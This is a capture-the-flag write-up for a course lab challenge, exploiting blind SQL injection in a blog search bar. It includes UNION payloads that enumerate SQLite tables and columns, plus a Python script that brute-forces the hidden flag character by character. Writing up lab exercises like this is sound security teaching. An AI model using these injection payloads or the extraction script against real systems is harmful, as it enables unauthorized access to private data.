# Challenge `Sometimes we are just temporarily blind-v2` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Vulnerable to SQL injection

- Where: Where is the vulnerability present
  - `http://mustard.stt.rnl.tecnico.ulisboa.pt:23262`, on the search bar

- Impact: What results of exploiting this vulnerability
  - Allows the user to access hidden articles

## Steps to reproduce

1. Navigate to `http://mustard.stt.rnl.tecnico.ulisboa.pt:23262`
2. The seach executes the following query and is vulnerable to SQLi (discovered by inputting `'` with a random string following):

```sql
SELECT id, title, content FROM blog_post WHERE title LIKE '%<input>%' OR content LIKE '%input%' 
```

3. It is possible to view in the page how many returned from the query but not their content
4. We can brute-force a query like the one that follows, changing the values in the `LIKE` function in order to obtain the table names:

```SQL
' UNION SELECT tbl_name, tbl_name, tbl_name FROM sqlite_master WHERE tbl_name LIKE '<guess>%' --
```

5. A table named `super_s_sof_secrets` is found
6. We can brute-force another query to get the `CREATE` statement for this table (along with the column names):

```SQL
' UNION SELECT sql, tbl_name, tbl_name FROM sqlite_master WHERE type='table' AND name='super_s_sof_secrets' AND sql LIKE '<guess>%' --
```

7. A column named `secret` is found
8. Finally, we can get the flag by brute-forcing the final query, using `GLOB` for a case-sensitive `SELECT`:

```SQL
' UNION SELECT secret, secret, secret FROM super_s_sof_secrets WHERE secret GLOB '*SSof<guess>*' --
```

The code used was:

```py
import requests
import urllib.parse

def discover(base_url):
    valid_combinations = []
    valid_letters = 'abcdefghijklmnopqrstuvwxyz_ABCEDFGHIJKLMNOPQRSTUVWXYZ \{\}'

    for letter in valid_letters:
        encoded_letter = urllib.parse.quote(letter)
        url = base_url.format(encoded_letter)
        res = requests.get(url)
        if '4' not in res.text:
            valid_combinations.append(letter)
            print("SSof" + letter)

    result = ""
    while len(valid_combinations) != 0:
        new_valid_combinations = []
        for prefix in valid_combinations:
            for letter in valid_letters:
                encoded_letter = urllib.parse.quote(prefix + letter)
                url = base_url.format(encoded_letter)
                res = requests.get(url)
                if '4' not in res.text:
                    new_valid_combinations.append(prefix + letter)
                    result = prefix + letter
                    print("SSof" + prefix + letter)
                    break
        valid_combinations = new_valid_combinations
    return result

table_name = "super_s_sof_secrets"
column_name = "secret"

# ' UNION SELECT secret, secret, secret FROM super_s_sof_secrets WHERE secret GLOB '*SSof*' --
base_url = "http://mustard.stt.rnl.tecnico.ulisboa.pt:23262/?search=%27+UNION+SELECT+secret%2C+secret%2C+secret+FROM+" + table_name + "+WHERE+" + column_name + "+GLOB+%27*SSof{}*%27+--"
print("Secret: " + "SSof" + discover(base_url))
```

Note: Steps 4-7 were ommited in the code, since their results had already been obtained in v1 of this exercise